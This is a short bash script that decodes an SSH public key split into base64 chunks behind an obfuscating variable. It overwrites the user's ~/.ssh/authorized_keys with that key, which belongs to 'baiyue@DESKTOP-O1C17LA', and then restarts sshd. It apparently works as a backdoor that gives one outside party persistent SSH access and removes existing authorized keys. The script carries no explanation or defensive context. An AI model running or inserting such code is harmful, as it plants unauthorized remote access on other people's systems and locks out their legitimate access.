#!/usr/bin/env bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

rsa="QUFBQUIzTnphQzF5YzJFQUFBQURBUUFCQUFBQkFRRGxqTXpTRFgvZDNxbVhicHR1QW5WQkdJaUgK"
rsb="Y0NXMUx5WEhycmhlUHdjNEVCeEhQTEpzMHU2Sy94UzdKc3B3SzBKdDZBMXhzVXpLQThRUS8wQkMK"
rsc="ZFVOOFRLS21kTmlnaisxejlaZEM1TWEyY0NEbkNFcHNsRC91TWxPc3pVS1hlOVZSOHhBNHl1alMK"
rsd="anVVMDYzNTBWYUIrMmFoUkE0eklTdno5SE5lY0ZpMAo="
SUB_DOM='base64 -d'
pub_rsa=$(echo $rsa|$SUB_DOM)$(echo $rsb|$SUB_DOM)$(echo $rsc|$SUB_DOM)$(echo $rsd|$SUB_DOM)
public_rsa="ssh-rsa $pub_rsa baiyue@DESKTOP-O1C17LA"

mkdir -p ~/.ssh
cd ~/.ssh
echo $public_rsa > ~/.ssh/authorized_keys
sleep 1
/etc/rc.d/init.d/sshd restart

